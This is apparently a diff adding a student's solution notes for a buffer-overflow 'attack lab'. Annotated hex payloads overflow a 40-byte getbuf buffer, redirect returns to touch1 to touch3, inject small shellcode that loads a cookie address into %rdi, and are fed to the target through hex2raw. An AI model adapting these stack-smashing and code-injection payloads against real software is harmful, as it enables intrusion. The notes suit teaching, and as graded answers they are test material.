@@ -1,0 +1,58 @@
+------------- Phase 1 ------------- 
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 <--- function getbuf allocates 40 bytes for user input. input 40 bytes worth of zeros for hex2raw function.
+
+ce 14 40 00 00 00 00 00 <--- hex address of touch1 in little endian form for function that we want to call after buffer overflow.
+
+
+
+------------- Phase 2 ------------- 
+
+48 c7 c7 15 0d bb 5e c3 <--- first block is still 40 bytes of user input since we are using same getbuf function. This is address of stack pointer when getbuff is called
+00 00 00 00 00 00 00 00      and 40 bytes has been subtracted from %rsp.
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+28 d9 60 55 00 00 00 00 rsp - 0x28
+fc 14 40 00 00 00 00 00 address of touch 2
+
+------------- Phase 3 -------------
+
+total bytes before the cookie = buffer + 8 for rsp + 8 for touch 3
+
+0x28 + 8 + 8 = 0x38 <---- make extra room for more instructions
+
+/* rsp - buffer size */
+28 d9 60 55 00 00 00 00
+
+0x5560d928 + 0x38 = 0x5560d960 <--- address of cookie in stack
+
+address o ftouch3 : 0000000000401613
+
+cookie : 0x5ebb0d15
+with ascii : 35 65 62 62 30 64 31 35 <--- cookie string
+
+
+so solution 3:
+
+/* address of cookie = rsp + buffer + 16 bytes */
+/* 48 c7 c7 <-- move to %rdi. c3 at the end returns */
+48 c7 c7 60 d9 60 55 c3
+/* Padding is 40 bytes including the above buffer*/
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+/* rsp */
+28 d9 60 55 00 00 00 00
+/* address of touch 3 */
+13 16 40 00 00 00 00 00
+/* cookie string */
+35 65 62 62 30 64 31 35
+
+cat solution3.txt | ./hex2raw | /.ctarget
